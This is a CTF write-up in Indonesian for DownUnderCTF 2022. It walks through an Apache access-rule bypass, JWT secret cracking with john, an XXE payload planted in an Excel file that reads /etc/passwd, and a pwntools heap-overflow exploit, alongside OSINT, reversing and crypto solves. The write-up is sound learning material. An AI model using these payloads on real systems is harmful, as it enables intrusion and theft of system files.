# babyp(y)wn
![](Pasted%20image%2020220925192012.png)

# helicoptering

Membypass rule .htaccess
- bypass pertama menggunakan Host: localhost
req:

```http
GET /one/flag.txt HTTP/1.1
Host: localhost
Connection: close
```

res:

```http
HTTP/1.1 200 OK
Date: Fri, 23 Sep 2022 09:44:46 GMT
Server: Apache/2.4.54 (Unix)
Last-Modified: Tue, 20 Sep 2022 12:48:21 GMT
ETag: "f-5e91b3e3b0f40"
Accept-Ranges: bytes
Content-Length: 15
Connection: close
Content-Type: text/plain

DUCTF{thats_it_
```

- Bypass kedua menggunakan fl%61g.txt (url encoding)

req:

```http
GET /two/fl%61g.txt HTTP/1.1
Host: localhost
Connection: close
```

res:

```http
HTTP/1.1 200 OK
Date: Fri, 23 Sep 2022 09:47:39 GMT
Server: Apache/2.4.54 (Unix)
Last-Modified: Tue, 20 Sep 2022 12:48:21 GMT
ETag: "19-5e91b3e3b0f40"
Accept-Ranges: bytes
Content-Length: 25
Connection: close
Content-Type: text/plain

next_time_im_using_nginx}
```

# Twitter

Flag : DUCTF{the-mascot-on-the-ductf-hoodie-is-named-ducky}

![](Pasted%20image%2020220925192200.png)

# Discord
sumber : memes channel DUCTF discord server

Flag : DUCTF{G'day_mates_this'll_be_a_cracka}

![](Pasted%20image%2020220925192221.png)

# Honk Honk

DIberikan sebuah registration name atas nama 23HONK, objektif chall ini adalah mencari tanggal dimana registration akan expired, mencari registration expired date dengan menggunakan web https://free-rego-check.service.nsw.gov.au/

Flag : DUCTF{19/07/2023}

![](Pasted%20image%2020220925192245.png)

# Bridget returns!

DIberikan sebuah 3 kata yaitu download.pausing.counterparts, terlihat sepertinya ini mengarah pada what3words, langsung saja cek kata tersebut di website https://what3words.com/, objektif chall ini adalah mencari apa nama jembatan yang digunakan untuk pertemuan, melihat2 sekitar map akan menemukan jembatan dengan nama "Ted Smout Memorial Bridge"

Flag : DUCTF{TedSmoutMemorialBridge} 

![](Pasted%20image%2020220925192305.png)

# doxme

DIberikan sebuah attachment berupa file dari microsoft office, dengan sedikit recon, didalam folder word/media, kita akan menemukan 2 image yang merupakan flag dengan 2 potongan

![](Pasted%20image%2020220925192349.png)

![](Pasted%20image%2020220925192359.png)

![](Pasted%20image%2020220925192410.png)

Flag : DUCTF{WOrd_D0Cs_Ar3_R34L1Y_W3ird}

# source provided

![](Pasted%20image%2020220925192451.png)

![](Pasted%20image%2020220925192503.png)

# LegitAppNotRansomware

![](Pasted%20image%2020220925192528.png)

File dipack (entah pake apa), jadi aku dump pake .NET Dumper
akhirnya aku unpack dan dapet .net ini
point penting ada disini, dia ngecompare password dengan beberapa string di concatenate

![](Pasted%20image%2020220925192546.png)

hasil encode dari gabungan string tersebut dapet ini:

```
UkZWRFZFWjdaREZrWDNrd2RWOXdZVzR4WTE4d2NsOWpNREJzWDJGelgyTjFZM1Z0WWpOeWZRPT0
```

didecode lagi dpt flagnya
DUCTF{d1d_y0u_pan1c_0r_c00l_as_cucumb3r}

# Clicky

![](Pasted%20image%2020220925192621.png)

file di pack dengan hal yg sama
didump dan dapet .net
kuncinya ada gambar diatas
Unscambler = base64 decode > base64 decode (iya 2x) 
Random_Function = hex to string
DUCTF{did_you_use_a_TAS?_ZGVhZGIzM2ZjYWZl}

# treasure hunt

Weak JWT Token,
Masukkan access_token_cookie kedalam jwt.txt
bruteforce menggunakan john

```bash
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

maka akan ketemu password: onepiece
tinggal kita rubah saja param sub di jwt menjadi 1 
disini saya menggunakan https://jwt.io/ 

![](Pasted%20image%2020220925192703.png)

![](Pasted%20image%2020220925192712.png)

# Does it fit my ctf

Soal ini ngelanjutin soal dari honk honk. Idenya tinggal cari youtuber yg sempet punya nissan march 3 turbo dgn plat 23HONK. Tinggal cari di google dapet

Flag: DUCTF{mightycarmods}

![](Pasted%20image%2020220925192904.png)

# Rage!

Diberikan sebuah attachment berupa file .wav, saat dibuka berisi sebuah audio music(?), dan disisipkan juga sebuah morse code, namun karena morse code dan music tersebut bertabrakan, jadi susah untuk mengidentifikasi morse code tersebut

Untuk solve, import audio tersebut di sonic visualizer -> layer-> add spectogram, lalu dibawah akan ada kode morse, input morse 1 per 1 untuk di decode melalui web online

dibutuhkan kesabaran dan ketelitian untuk mendapatkan flag di chall ini, karena ada beberapa morse yang tampak buram

Morse : .-./.-/--./../-./--./-/---/.--/./../.-./-../.-../../-.../../-../---
Flag : DUCTF{RAGINGTOWEIRDLIBIDO}

![](Pasted%20image%2020220925192923.png)

# baby arx
diberikan sebuah hex yang merupakan byte dari list yang berisi ciphertext.
dari algoritmanya ketahuan bahwa cipher text dihasilkan dari perjumlahan 2 bilangan.
cipher `text = flag[i] +flag[i+1]`, maka dari itu kita dapat membruteforce nilai `flag[i+1]`
berdasarkan plaintext yang telah diketahui yaitu "DUCTF" untuk scriptnya 

[https://pastebin.com/buRjhEbC](https://pastebin.com/buRjhEbC "https://pastebin.com/buRjhEbC")
```python
data = "cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b"
data = list(bytes.fromhex(data))
flag = [68,85,67,84,70]
 
def brute(p,q):
    for i in range(0,125):
        for j in range(0,125):
            b1 = i
            b2 = j
            b1 = (b1 ^ ((b1 << 1) | (b1 & 1))) & 0xff
            b2 = (b2 ^ ((b2 >> 5) | (b2 << 3))) & 0xff
            b = (b1 + b2)%256
            if b == p and i ==q:
                return j
 
 
for i in range(len(data)):
    y = brute(data[i+4],flag[i+4])
    if y == None:
        print("}",end="")
        break
    print(chr(y),end="")
    flag.append(y)
```

![](Pasted%20image%2020220925193009.png)

# Solve Me 

kita diberikan attachment yang berisi kode .sol yang merukana kode smart contract dari solidity etherium 

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title SolveMe
 * @author BlueAlder duc.tf
 */
contract SolveMe {
    bool public isSolved = false;

    function solveChallenge() external {
        isSolved = true;
    }
   
}
```

Dalam kode solitude diatas kita perlu menge-call fungsi solveChallenge di dalam contract SolveME untuk mendapat flagnya yang akan diberikan setelah kita merubah value variable isSolved menjadi true. 

Pertama kita perlu mendapatkan address wallet dan contract address dari /challenge pada web

```json
{"player_wallet":{"address":"0x945FFa2392E952AC330AE62a4aa22Af1f1A6F0AB","private_key":"0xad04e1c46addb505f631c26c26ce8490fe801b4534eaf2cea2111d5cc8e3fb39","balance":"2.0 ETH"},"contract_address":[{"address":"0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8","name":"SolveMe.sol"}]}
```

Setelah itu kita perlu menggenerate ABI (Application Binary Interface), disini saya menggunakan web https://remix.ethereum.org/ 

![](Pasted%20image%2020220925193231.png)

hasilnya saya copy ke variable ABI

```python
    const ABI = [
        {
            "inputs": [],
            "name": "solveChallenge",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]
```

setelah itu kita hanya perlu untuk mengirim request kepada Json Rpc endpoint menggunakan signer (player_wallet dan privkeynya) dan provider (url endpoint dari json Rpc-nya) 

solver:

```python
const { ethers } = require("/usr/lib/node_modules/ethers");

async function myEther() {
    const provider = new ethers.providers.JsonRpcProvider(
        // provider address
        "https://blockchain-solveme-b6f172ca3bb89122-eth.2022.ductf.dev/",
    )
    const signer = new ethers.Wallet(
        // player_wallet private key
        "0xad04e1c46addb505f631c26c26ce8490fe801b4534eaf2cea2111d5cc8e3fb39",
        provider
    )

    // ABI map
    const ABI = [
        {
            "inputs": [],
            "name": "solveChallenge",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]

    // contract address of SolveMe.sol
    contract_address = "0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8"
    const ChallContact = new ethers.Contract(contract_address, ABI, signer)

    // view blocknum and ballance of player_wallet
    BlockNum = await provider.getBlockNumber()
    Balance = await provider.getBalance(signer.address)
    
    // call solveChallenge()
    await ChallContact.functions.solveChallenge()
    
    // get value of isSolved variable
    data = await ChallContact.functions.isSolved()
    

    console.log(
        {
            "BlockNumber": BlockNum,
            "Balance": eval(Balance["_hex"]),
            "Contact": {
                "data": data,
            }
        }
    )
}

myEther()
```

Referensi:
https://docs.ethers.io/v5/
https://www.youtube.com/watch?v=g_t0Td4Kr6M 

# dyslexxec (web)

Tipe serangan XXE dan LFI
Pada source file getExcelMetadata.py kita akan melihat fungsi findInternalFilepath

```python
def findInternalFilepath(filename):
    try:
        prop = None
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        tree = etree.parse(filename, parser=parser)
        root = tree.getroot()
        internalNode = root.find(".//{http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac}absPath")
        if internalNode != None:
            prop = {
                "Fieldname":"absPath",
                "Attribute":internalNode.attrib["url"],
                "Value":internalNode.text
            }
        return prop

```

Ini vulnerable dengan serangan XXE karena file "xl/workbook.xml" dari file excell yang kita upload akan terparse terlebih dahulu dengan "etree.XMLParser".
disini kita perlu menambah XML Entitiy yang akan mempoint ke file /etc/passwd dimana flag berada.

unzip excel dan rubah pada file "xl/workbook.xml" lalu zip lagi dengan format .xml

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
...snip...
           <x15ac:absPath url="/Users/Shared/" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac">&example;</x15ac:absPath>
...snip...
```

send:

```python
import requests

URL = "https://web-dyslexxec-773a3cb4c483.2022.ductf.dev"

req = requests.post(
    url=f"{URL}/metadata",
    files={
        "file": open("fizzbuzz/fizzbuzz.xlsm", "rb")
    },
    # proxies={"https":"http://localhost:8080"},
    verify=False
)
print(req.text)
```

![](Pasted%20image%2020220925193444.png)

Reference:
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

# login

```python
from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys


BINARY = "login"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"> ", content)
        
    def add_user(self, username_lenght: bytes, username: bytes = None, send_username: bool = True):
        p = self.p
        self.send(b"1")
        p.sendlineafter(b"Username length: ", username_lenght)
        if send_username:
            p.sendlineafter(b"Username: ", username)
    
    def login(self, username: bytes):
        p = self.p
        self.send(b"2")
        p.sendlineafter(b"Username: ", username)

x, p = init()

pay = b"A"*28 # overflow heap
pay += pack("<Q", 0x20d00) # agar heap size tidak berubah
pay += b"\x13\x37"[::-1] # rubah id menjadi 0x1337
x.add_user(pay, send_username=False)
x.add_user(b"10", b"dimas", send_username=True) # membuat username dimas
x.login(b"dimas") # login dengan username dimas yang idnya berubah menjadi 1337
# x.debug("heap chunks") # debug chunk (ekstensi gef)
p.interactive() # shell
```

overwrite heap address menggunakan heapoverflow di "Username length: "

![](Pasted%20image%2020220925193527.png)